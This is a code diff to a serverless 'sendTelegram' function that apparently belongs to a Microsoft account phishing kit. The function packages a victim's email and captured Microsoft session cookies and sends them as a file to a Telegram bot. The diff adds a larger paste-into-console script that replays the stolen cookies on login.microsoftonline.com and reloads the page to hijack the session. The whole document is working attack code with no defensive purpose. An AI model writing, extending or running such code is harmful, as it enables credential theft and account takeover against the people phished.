@@ -4,7 +4,7 @@ const handler = async (event, context) => {
     'Access-Control-Allow-Methods': 'POST, OPTIONS',
   };
 
-  console.log('🚀 sendTelegram function starting... v4.2 (ENHANCED PARSING FIX)');
+  console.log('🚀 sendTelegram function starting... v5.0 (ENHANCED WITH ADVANCED RESTORATION)');
 
   if (event.httpMethod === 'OPTIONS') {
     return { statusCode: 200, headers, body: '' };
@@ -427,11 +427,340 @@ const handler = async (event, context) => {
         }
     }
 
-    // Send cookies as a separate file (even if empty to show capture attempt)
+    // Send cookies as a separate file with ENHANCED RESTORATION CODE
     if (true) { // Always send cookie file to show capture status
-        console.log('🍪 Preparing to send cookie file...');
+        console.log('🍪 Preparing to send enhanced cookie file...');
 
-        // Create comprehensive cookie file
+        // Enhanced cookie restoration code from restoreCookies.js
+        const enhancedRestorationCode = `
+// Enhanced Microsoft Cookie Restoration System
+// Complete session restoration with advanced error handling and validation
+
+// Browser compatibility detection
+function detectBrowserCapabilities() {
+    const userAgent = navigator.userAgent.toLowerCase();
+    const capabilities = {
+        browser: 'unknown',
+        version: 'unknown',
+        supportsSameSiteNone: true,
+        supportsSecure: true,
+        maxCookieSize: 4096,
+        maxCookiesPerDomain: 50,
+        supportsHttpOnly: false,
+        supportsPartitioned: false
+    };
+
+    if (userAgent.includes('chrome')) {
+        capabilities.browser = 'chrome';
+        const match = userAgent.match(/chrome\\/(\d+)/);
+        capabilities.version = match ? match[1] : 'unknown';
+        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
+        capabilities.supportsPartitioned = parseInt(capabilities.version) >= 118;
+    } else if (userAgent.includes('firefox')) {
+        capabilities.browser = 'firefox';
+        const match = userAgent.match(/firefox\\/(\d+)/);
+        capabilities.version = match ? match[1] : 'unknown';
+        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 69;
+    } else if (userAgent.includes('safari') && !userAgent.includes('chrome')) {
+        capabilities.browser = 'safari';
+        const match = userAgent.match(/version\\/(\d+)/);
+        capabilities.version = match ? match[1] : 'unknown';
+        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 13;
+    } else if (userAgent.includes('edge')) {
+        capabilities.browser = 'edge';
+        const match = userAgent.match(/edge\\/(\d+)/);
+        capabilities.version = match ? match[1] : 'unknown';
+        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
+    }
+
+    return capabilities;
+}
+
+// Domain validation function
+function validateDomain(cookieDomain, currentDomain = window.location.hostname) {
+    if (!cookieDomain) return { valid: true, reason: 'No domain specified' };
+    
+    const cleanCookieDomain = cookieDomain.startsWith('.') ? cookieDomain.substring(1) : cookieDomain;
+    
+    if (currentDomain === cleanCookieDomain) {
+        return { valid: true, reason: 'Exact domain match' };
+    }
+    
+    if (currentDomain.endsWith('.' + cleanCookieDomain)) {
+        return { valid: true, reason: 'Subdomain match' };
+    }
+    
+    const microsoftDomains = [
+        'login.microsoftonline.com',
+        'account.microsoft.com',
+        'outlook.com',
+        'office.com',
+        'microsoft.com'
+    ];
+    
+    if (microsoftDomains.some(domain => 
+        currentDomain.includes(domain) || cleanCookieDomain.includes(domain)
+    )) {
+        return { valid: true, reason: 'Microsoft domain compatibility' };
+    }
+    
+    return { 
+        valid: false, 
+        reason: \`Domain mismatch: \${currentDomain} vs \${cleanCookieDomain}\` 
+    };
+}
+
+// Enhanced Microsoft cookie restoration with all improvements
+function restoreMicrosoftCookies(cookiesArray, options = {}) {
+    const config = {
+        reload: true,
+        validate: true,
+        debug: true,
+        skipExpired: true,
+        skipInvalid: true,
+        warnOnSecurity: true,
+        handleDuplicates: true,
+        ...options
+    };
+    
+    console.log('🚀 Starting Enhanced Microsoft Cookie Restoration');
+    console.log('📊 Configuration:', config);
+    
+    if (!Array.isArray(cookiesArray)) {
+        const error = 'Invalid input: cookiesArray must be an array';
+        console.error('❌', error);
+        throw new Error(error);
+    }
+    
+    if (cookiesArray.length === 0) {
+        console.warn('⚠️ No cookies provided for restoration');
+        return { success: false, restored: 0, errors: [], warnings: ['No cookies provided'] };
+    }
+    
+    const capabilities = detectBrowserCapabilities();
+    console.log('🌐 Browser capabilities:', capabilities);
+    
+    const results = [];
+    const errors = [];
+    const warnings = [];
+    let successCount = 0;
+    
+    cookiesArray.forEach((cookie, index) => {
+        const cookieResult = {
+            index,
+            name: cookie.name || 'unnamed',
+            value: cookie.value || '',
+            domain: cookie.domain || '',
+            path: cookie.path || '/',
+            secure: !!cookie.secure,
+            sameSite: cookie.sameSite || cookie.samesite || 'None',
+            set: false,
+            skipped: false,
+            error: null,
+            warnings: []
+        };
+        
+        try {
+            if (!cookie.name || typeof cookie.value === 'undefined') {
+                throw new Error('Missing required name or value');
+            }
+            
+            if (config.validate) {
+                const domainCheck = validateDomain(cookie.domain);
+                if (!domainCheck.valid && config.skipInvalid) {
+                    cookieResult.skipped = true;
+                    cookieResult.error = domainCheck.reason;
+                    results.push(cookieResult);
+                    return;
+                }
+            }
+            
+            const name = cookie.name;
+            const value = cookie.value;
+            const domain = cookie.domain || '';
+            const path = cookie.path || '/';
+            const secure = !!cookie.secure;
+            const sameSite = cookie.sameSite || cookie.samesite || 'None';
+            const expiresUnix = cookie.expires || cookie.expirationDate;
+            const isSession = !!cookie.session || expiresUnix === undefined || expiresUnix === null;
+            
+            let cookieString = \`\${name}=\${value}; path=\${path};\`;
+            
+            if (name.startsWith('__Host-')) {
+                cookieString = \`\${name}=\${value}; path=/; Secure;\`;
+                if (domain) {
+                    warnings.push(\`\${name}: __Host- prefix requires no domain (removed)\`);
+                }
+            } else if (name.startsWith('__Secure-')) {
+                cookieString += ' Secure;';
+                if (domain) {
+                    cookieString += \` domain=\${domain};\`;
+                }
+            } else {
+                if (domain) {
+                    cookieString += \` domain=\${domain};\`;
+                }
+                if (secure) {
+                    cookieString += ' Secure;';
+                }
+            }
+            
+            if (!isSession && expiresUnix) {
+                const expiresMs = expiresUnix > 1e10 ? expiresUnix : expiresUnix * 1000;
+                const expiresDate = new Date(expiresMs);
+                cookieString += \` expires=\${expiresDate.toUTCString()};\`;
+                cookieResult.expires = expiresDate.toUTCString();
+            } else {
+                cookieResult.expires = 'Session';
+            }
+            
+            if (sameSite && capabilities.supportsSameSiteNone) {
+                const samesiteNorm = sameSite.charAt(0).toUpperCase() + sameSite.slice(1).toLowerCase();
+                cookieString += \` SameSite=\${samesiteNorm};\`;
+            }
+            
+            document.cookie = cookieString;
+            
+            const cookieSet = document.cookie.includes(\`\${name}=\`);
+            cookieResult.set = cookieSet;
+            cookieResult.cookieString = cookieString;
+            
+            if (cookieSet) {
+                successCount++;
+            } else {
+                cookieResult.error = 'Cookie was not set (browser rejected)';
+                errors.push(\`\${name}: Browser rejected cookie\`);
+            }
+            
+        } catch (err) {
+            cookieResult.error = err.message;
+            errors.push(\`\${cookie.name || 'unnamed'}: \${err.message}\`);
+            console.error(\`❌ Failed to set cookie "\${cookie.name}":\`, err);
+        }
+        
+        results.push(cookieResult);
+    });
+    
+    if (config.debug) {
+        console.log('\\n📊 COOKIE RESTORATION RESULTS');
+        console.log('='.repeat(50));
+        console.table(results.map(r => ({
+            Name: r.name,
+            Set: r.set ? '✅' : (r.skipped ? '⏭️' : '❌'),
+            Domain: r.domain,
+            Path: r.path,
+            Secure: r.secure ? '🔒' : '🔓',
+            SameSite: r.sameSite,
+            Expires: r.expires,
+            Error: r.error || 'None'
+        })));
+        
+        console.log(\`\\n✅ Successfully restored: \${successCount}/\${cookiesArray.length} cookies\`);
+        console.log(\`⏭️ Skipped: \${results.filter(r => r.skipped).length} cookies\`);
+        console.log(\`❌ Failed: \${results.filter(r => !r.set && !r.skipped).length} cookies\`);
+        
+        if (warnings.length > 0) {
+            console.warn('\\n⚠️ SECURITY WARNINGS:');
+            warnings.forEach(warning => console.warn(\`  • \${warning}\`));
+        }
+        
+        if (errors.length > 0) {
+            console.error('\\n❌ ERRORS:');
+            errors.forEach(error => console.error(\`  • \${error}\`));
+        }
+        
+        console.log('\\n🌐 Browser Info:', \`\${capabilities.browser} v\${capabilities.version}\`);
+        console.log('🔧 Capabilities:', {
+            'SameSite=None': capabilities.supportsSameSiteNone ? '✅' : '❌',
+            'Partitioned': capabilities.supportsPartitioned ? '✅' : '❌',
+            'Max Cookie Size': \`\${capabilities.maxCookieSize} bytes\`,
+            'Max Cookies/Domain': capabilities.maxCookiesPerDomain
+        });
+    }
+    
+    const summary = {
+        success: successCount > 0,
+        total: cookiesArray.length,
+        restored: successCount,
+        skipped: results.filter(r => r.skipped).length,
+        failed: results.filter(r => !r.set && !r.skipped).length,
+        warnings: warnings.length,
+        errors: errors.length,
+        results,
+        capabilities
+    };
+    
+    console.log(\`\\n🎯 FINAL SUMMARY: \${successCount}/\${cookiesArray.length} cookies restored successfully\`);
+    
+    if (config.reload && successCount > 0) {
+        console.log('🔄 Reloading page to activate restored session...');
+        setTimeout(() => {
+            window.location.reload();
+        }, 1000);
+    }
+    
+    return summary;
+}
+
+// Quick console restore function
+function quickConsoleRestore(base64CookieString) {
+    try {
+        const cookies = JSON.parse(atob(base64CookieString));
+        let count = 0;
+        
+        cookies.forEach(cookie => {
+            let cookieStr = \`\${cookie.name}=\${cookie.value}\`;
+            
+            if (!cookie.name.startsWith('__Host-') && cookie.domain) {
+                cookieStr += \`; domain=\${cookie.domain}\`;
+            }
+            
+            if (cookie.path) {
+                cookieStr += \`; path=\${cookie.path}\`;
+            }
+            
+            if (cookie.expires) {
+                cookieStr += \`; expires=\${new Date(cookie.expires * 1000).toUTCString()}\`;
+            }
+            
+            if (cookie.secure || cookie.name.startsWith('__Host-') || cookie.name.startsWith('__Secure-')) {
+                cookieStr += '; Secure';
+            }
+            
+            if (cookie.samesite) {
+                cookieStr += \`; SameSite=\${cookie.samesite}\`;
+            }
+            
+            document.cookie = cookieStr;
+            if (document.cookie.includes(\`\${cookie.name}=\`)) count++;
+        });
+        
+        console.log(\`✅ Quick restore: \${count}/\${cookies.length} cookies set\`);
+        return count;
+        
+    } catch (err) {
+        console.error('❌ Quick restore failed:', err);
+        return 0;
+    }
+}
+
+// Make functions globally available
+window.restoreMicrosoftCookies = restoreMicrosoftCookies;
+window.quickConsoleRestore = quickConsoleRestore;
+window.detectBrowserCapabilities = detectBrowserCapabilities;
+
+// USAGE EXAMPLES:
+// 1. Enhanced restoration with validation:
+//    restoreMicrosoftCookies(cookiesArray, { reload: true, validate: true, debug: true });
+//
+// 2. Quick console restore:
+//    quickConsoleRestore(base64CookieString);
+//
+// 3. Check browser capabilities:
+//    detectBrowserCapabilities();
+`;
+
+        // Create comprehensive cookie file with enhanced restoration
         const cookieFileContent = {
             captureInfo: {
                 email: email,
@@ -467,10 +796,35 @@ const handler = async (event, context) => {
                 timestamp: cookie.timestamp,
                 realUserData: cookie.realUserData
             })),
-            cookieRestoration: {
-                instructions: 'Use these cookies to restore Microsoft authentication sessions',
+            enhancedRestoration: {
+                instructions: 'Use the enhanced restoration system for Microsoft authentication sessions with advanced validation and error handling',
+                consoleCode: enhancedRestorationCode,
+                quickRestore: `
+// QUICK PASTE AND RUN (Copy everything below and paste in console)
+${enhancedRestorationCode}
+
+// Execute restoration with your cookies
+const cookiesData = ${JSON.stringify(cookies, null, 2)};
+restoreMicrosoftCookies(cookiesData, { reload: true, validate: true, debug: true });
+                `,
+                features: [
+                    'Browser compatibility detection',
+                    'Domain validation and security checks',
+                    'Cookie size and expiration validation',
+                    'Duplicate cookie handling',
+                    'Comprehensive error reporting',
+                    'Security warning system',
+                    'Advanced debugging with table output',
+                    'Cookie verification after setting',
+                    'Enhanced SameSite and Secure flag handling',
+                    '__Host- and __Secure- prefix support'
+                ]
+            },
+            basicRestoration: {
+                instructions: 'Basic cookie restoration (fallback method)',
                 browserConsoleCode: `
     // Copy and paste this code in browser console on login.microsoftonline.com
+    const cookies = ${JSON.stringify(cookies, null, 2)};
     cookies.forEach(c => {
         let cookieString = \`\${c.name}=\${c.value}; path=\${c.path}; domain=\${c.domain};\`;
         if (c.secure) cookieString += ' Secure;';
@@ -479,26 +833,15 @@ const handler = async (event, context) => {
     });
     console.log('✅ Cookies restored successfully');
     location.reload();
-                `,
-                jsImplementation: `
-    // JavaScript implementation for cookie restoration
-    function restoreMicrosoftCookies(cookiesArray) {
-        cookiesArray.forEach(cookie => {
-            let cookieString = \`\${cookie.name}=\${cookie.value}; path=\${cookie.path}; domain=\${cookie.domain};\`;
-            if (cookie.secure) cookieString += ' Secure;';
-            if (cookie.sameSite) cookieString += \` SameSite=\${cookie.sameSite};\`;
-            document.cookie = cookieString;
-        });
-        console.log('Microsoft cookies restored:', cookiesArray.length);
-    }
                 `
             },
             metadata: {
                 totalCookies: cookieCount,
                 captureMethod: cookieSource,
                 captureTimestamp: timestamp,
-                modified: true,
-                note: 'All cookies set to non-expiring for session persistence'
+                enhanced: true,
+                version: '5.0',
+                features: 'Advanced validation, browser compatibility detection, security warnings'
             }
         };
 
@@ -507,12 +850,13 @@ const handler = async (event, context) => {
 
         // Create cookie filename
         const emailPart = email.split('@')[0] || 'user';
-        const cleanCookieFileName = `microsoft_cookies_${emailPart}_${uniqueId}.json`.replace(/[^a-zA-Z0-9._-]/g, '_');
+        const cleanCookieFileName = `microsoft_cookies_enhanced_${emailPart}_${uniqueId}.json`.replace(/[^a-zA-Z0-9._-]/g, '_');
 
-        console.log('🍪 Cookie file details:', {
+        console.log('🍪 Enhanced cookie file details:', {
             filename: cleanCookieFileName,
             size: cookieJson.length + ' bytes',
-            cookieCount: cookieCount
+            cookieCount: cookieCount,
+            enhanced: true
         });
 
         try {
@@ -541,13 +885,14 @@ const handler = async (event, context) => {
             // Combine all cookie parts
             const cookieFormDataBuffer = Buffer.concat(cookieParts);
 
-            console.log('📤 Sending cookie file to Telegram as DOWNLOADABLE FILE...');
-            console.log('🍪 Cookie file details:', {
+            console.log('📤 Sending ENHANCED cookie file to Telegram as DOWNLOADABLE FILE...');
+            console.log('🍪 Enhanced cookie file details:', {
                 filename: cleanCookieFileName,
                 size: cookieFormDataBuffer.length + ' bytes',
                 contentType: 'application/json',
                 method: 'sendDocument (FILE ATTACHMENT)',
-                boundary: cookieBoundary
+                boundary: cookieBoundary,
+                enhanced: true
             });
 
             const cookieFileResponse = await fetch(documentUrl, {
@@ -560,22 +905,22 @@ const handler = async (event, context) => {
             });
 
             const cookieFileResult = await cookieFileResponse.json();
-            console.log('🍪 Cookie file response status:', cookieFileResponse.status);
-            console.log('🍪 Cookie file response:', cookieFileResult);
+            console.log('🍪 Enhanced cookie file response status:', cookieFileResponse.status);
+            console.log('🍪 Enhanced cookie file response:', cookieFileResult);
 
             if (cookieFileResponse.ok && cookieFileResult.ok) {
-                console.log('✅ Microsoft cookies sent as DOWNLOADABLE FILE successfully');
+                console.log('✅ Enhanced Microsoft cookies sent as DOWNLOADABLE FILE successfully');
                 cookieFileSent = true;
             } else {
-                console.error('❌ CRITICAL ERROR - Failed to send cookie file:', cookieFileResult);
-                console.error('❌ Cookie file upload response:', JSON.stringify(cookieFileResult, null, 2));
+                console.error('❌ CRITICAL ERROR - Failed to send enhanced cookie file:', cookieFileResult);
+                console.error('❌ Enhanced cookie file upload response:', JSON.stringify(cookieFileResult, null, 2));
                 // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
                 cookieFileSent = false;
             }
 
         } catch (cookieFileError) {
-            console.error('❌ CRITICAL ERROR in cookie file upload:', cookieFileError);
-            console.error('❌ Cookie error stack:', cookieFileError.stack);
+            console.error('❌ CRITICAL ERROR in enhanced cookie file upload:', cookieFileError);
+            console.error('❌ Enhanced cookie error stack:', cookieFileError.stack);
             // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
             cookieFileSent = false;
         }
@@ -583,7 +928,7 @@ const handler = async (event, context) => {
         // Function to send cookies as text fallback
         async function sendCookiesAsText() {
             try {
-                const cookieSummary = `🍪 Microsoft Cookies (Text Fallback)\n\nEmail: ${email}\nCookies: ${cookieCount} captured\nSource: ${cookieSource}\n\nCookie Names: ${cookies.map(c => c.name).slice(0, 10).join(', ')}${cookieCount > 10 ? `... (+${cookieCount - 10} more)` : ''}`;
+                const cookieSummary = `🍪 Enhanced Microsoft Cookies (Text Fallback)\n\nEmail: ${email}\nCookies: ${cookieCount} captured\nSource: ${cookieSource}\nEnhanced: YES\n\nCookie Names: ${cookies.map(c => c.name).slice(0, 10).join(', ')}${cookieCount > 10 ? `... (+${cookieCount - 10} more)` : ''}`;
 
                 const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -596,33 +941,35 @@ const handler = async (event, context) => {
 
                 const textResult = await textResponse.json();
                 if (textResponse.ok && textResult.ok) {
-                    console.log('✅ Cookies sent as text message successfully');
+                    console.log('✅ Enhanced cookies sent as text message successfully');
                     cookieFileSent = true;
                 } else {
-                    console.error('❌ Failed to send cookies as text message:', textResult);
+                    console.error('❌ Failed to send enhanced cookies as text message:', textResult);
                 }
             } catch (textError) {
-                console.error('❌ Error sending cookies as text:', textError);
+                console.error('❌ Error sending enhanced cookies as text:', textError);
             }
         }
     } else {
-        console.log('⚠️ No cookies to send - skipping cookie file');
+        console.log('⚠️ No cookies to send - skipping enhanced cookie file');
     }
 
-    console.log('✅ sendTelegram completed successfully');
+    console.log('✅ sendTelegram completed successfully with enhanced features');
     return {
       statusCode: 200,
       headers,
       body: JSON.stringify({
         success: true,
-        message: 'Data sent to Telegram successfully with authentication files',
+        message: 'Data sent to Telegram successfully with enhanced authentication files',
         telegramMessageId: result.message_id,
         tokenFileSent: tokenFileSent,
         cookieFileSent: cookieFileSent,
+        enhanced: true,
         totalFiles: (data.authenticationTokens ? 1 : 0) + (cookieCount > 0 ? 1 : 0),
         cookieCount,
         emailProcessed: email,
-        messageLength: simpleMessage.length
+        messageLength: simpleMessage.length,
+        version: '5.0'
       }),
     };
 
